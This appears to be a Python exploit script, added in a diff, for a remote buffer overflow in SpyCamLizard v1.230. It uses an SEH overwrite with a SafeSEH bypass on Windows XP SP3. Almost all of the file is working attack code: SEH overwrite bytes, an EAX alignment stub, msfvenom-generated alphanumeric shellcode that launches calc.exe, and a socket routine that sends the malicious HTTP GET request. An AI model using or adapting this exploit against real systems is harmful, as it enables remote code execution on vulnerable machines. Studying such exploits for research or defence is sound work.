@@ -1,0 +1,97 @@
+#!/usr/bin/python
+
+###############################################################################
+# Exploit Title:        SpyCamLizard v1.230 Remote Buffer Overflow (SafeSEH Bypass)
+# Date:                 20-06-2017
+# Exploit Author:       @abatchy17 -- www.abatchy.com
+# Vulnerable Software:  SpyCamLizard
+# Vendor Homepage:      http://www.spycamlizard.com/
+# Version:              1.230
+# Software Link:        http://spycamlizard.com/SpyCamLInstaller.exe
+# Tested On:            WinXP SP3 x86
+#
+# Credit to ScrR1pTK1dd13 for discovering the PoC (41667).
+#
+##############################################################################
+
+import socket
+import sys
+
+host = "127.0.0.1"
+port = 80
+
+nSEH = "\xeb\x10\x90\x90"
+
+# -----------------------------------------------------------------------------------------------------------------------------------------
+#  Module info :
+# -----------------------------------------------------------------------------------------------------------------------------------------
+#  Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | NXCompat | OS Dll | Version, Modulename & Path
+# -----------------------------------------------------------------------------------------------------------------------------------------
+#  0x10000000 | 0x100d6000 | 0x000d6000 | False  | True    | False |  False   | False  | 1.0.0.1 [ZTcore.dll] (C:\Program Files\SpyCam Lizard\ZTcore.dll)
+#  0x00400000 | 0x006ea000 | 0x002ea000 | False  | False   | False |  False   | False  | 1.230 [SCLiz.exe] (C:\Program Files\SpyCam Lizard\SCLiz.exe)
+# -----------------------------------------------------------------------------------------------------------------------------------------
+# 
+# Sine 1) SCLiz.exe always has a null byte for any address, 2) partial overwrite didn't work and 3)ZTcore.dll had SafeSEH enabled, none of the addresses in these modules could be used.
+# Luckily the output of "!mona seh -all" contained this entry and seemed to always work for WinXP SP3 x86 (kinda awful being on heap but seems to work):
+# 0x01726017 : call dword ptr ss:[ebp-18] | ascii {PAGE_READWRITE} [Heap]
+# This won't work on later versions of Windows thanks to ASLR
+SEH = "\x17\x60\x72\x01"
+
+llamaleftovers = (
+    # Since we used call dword ptr ss:[ebp-18] instead of POP POP RET, we can POP 4 times to get the current location.
+    # Now EAX contains address of instruction jumped to right after executing call dword ptr ss:[ebp-18]
+    "\x58\x58\x58\x58"  
+    "\x05\x55\x55\x55\x55"  # add EAX, 0x55555555
+    "\x05\x55\x55\x55\x55"  # add EAX, 0x55555555
+    "\x05\x56\x56\x55\x55"  # add EAX, 0x55555656 -> EAX = oldEAX + 0x100, shellcode generated should start exactly at EAX as we're using the x86/alpha_mixed with BufferRegister to get a purely alphanumeric shellcode
+)
+
+# msfvenom -a x86 --platform windows -p windows/exec CMD=calc.exe -e x86/alpha_mixed BufferRegister=EAX -f python
+# Payload size: 440 bytes
+buf =  ""
+buf += "\x50\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
+buf += "\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30"
+buf += "\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42"
+buf += "\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
+buf += "\x59\x6c\x6a\x48\x6f\x72\x57\x70\x77\x70\x75\x50\x71"
+buf += "\x70\x4d\x59\x79\x75\x66\x51\x6b\x70\x53\x54\x4e\x6b"
+buf += "\x30\x50\x66\x50\x6c\x4b\x76\x32\x34\x4c\x4c\x4b\x31"
+buf += "\x42\x77\x64\x6e\x6b\x51\x62\x75\x78\x66\x6f\x68\x37"
+buf += "\x52\x6a\x56\x46\x76\x51\x69\x6f\x6e\x4c\x37\x4c\x75"
+buf += "\x31\x73\x4c\x54\x42\x54\x6c\x51\x30\x4a\x61\x6a\x6f"
+buf += "\x36\x6d\x36\x61\x68\x47\x69\x72\x79\x62\x50\x52\x73"
+buf += "\x67\x6c\x4b\x32\x72\x56\x70\x4e\x6b\x30\x4a\x57\x4c"
+buf += "\x6e\x6b\x52\x6c\x46\x71\x44\x38\x59\x73\x30\x48\x47"
+buf += "\x71\x58\x51\x43\x61\x4e\x6b\x52\x79\x71\x30\x45\x51"
+buf += "\x48\x53\x4e\x6b\x67\x39\x44\x58\x79\x73\x54\x7a\x50"
+buf += "\x49\x6c\x4b\x65\x64\x4c\x4b\x76\x61\x39\x46\x44\x71"
+buf += "\x69\x6f\x6c\x6c\x4f\x31\x78\x4f\x56\x6d\x76\x61\x38"
+buf += "\x47\x44\x78\x79\x70\x51\x65\x6b\x46\x57\x73\x53\x4d"
+buf += "\x68\x78\x65\x6b\x73\x4d\x56\x44\x73\x45\x5a\x44\x70"
+buf += "\x58\x6e\x6b\x61\x48\x35\x74\x66\x61\x6b\x63\x30\x66"
+buf += "\x6c\x4b\x34\x4c\x70\x4b\x4e\x6b\x46\x38\x75\x4c\x63"
+buf += "\x31\x78\x53\x4c\x4b\x35\x54\x4e\x6b\x55\x51\x6e\x30"
+buf += "\x4d\x59\x77\x34\x44\x64\x74\x64\x31\x4b\x51\x4b\x70"
+buf += "\x61\x70\x59\x71\x4a\x42\x71\x39\x6f\x4b\x50\x53\x6f"
+buf += "\x71\x4f\x62\x7a\x4e\x6b\x35\x42\x6a\x4b\x6c\x4d\x63"
+buf += "\x6d\x73\x5a\x33\x31\x6e\x6d\x6c\x45\x58\x32\x45\x50"
+buf += "\x35\x50\x55\x50\x56\x30\x42\x48\x56\x51\x4e\x6b\x62"
+buf += "\x4f\x6e\x67\x49\x6f\x6e\x35\x4d\x6b\x4a\x50\x6f\x45"
+buf += "\x69\x32\x71\x46\x45\x38\x6e\x46\x6e\x75\x4f\x4d\x6f"
+buf += "\x6d\x69\x6f\x6b\x65\x67\x4c\x57\x76\x31\x6c\x46\x6a"
+buf += "\x4b\x30\x6b\x4b\x4d\x30\x70\x75\x75\x55\x4f\x4b\x71"
+buf += "\x57\x46\x73\x51\x62\x52\x4f\x51\x7a\x55\x50\x70\x53"
+buf += "\x59\x6f\x58\x55\x50\x63\x63\x51\x30\x6c\x72\x43\x74"
+buf += "\x6e\x65\x35\x44\x38\x71\x75\x33\x30\x41\x41"
+
+junk1 = "A" * 1173
+junk2 = "B"*16
+junk3 = "C"*213
+junk4 = "D"*3000
+
+exploit = junk1 + nSEH + SEH + junk2 + llamaleftovers + junk3 + buf + junk4
+
+httpsocket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+httpsocket.connect((host,port))
+httpsocket.send("GET " + exploit + " HTTP/1.0\r\n\r\n")
+httpsocket.close()
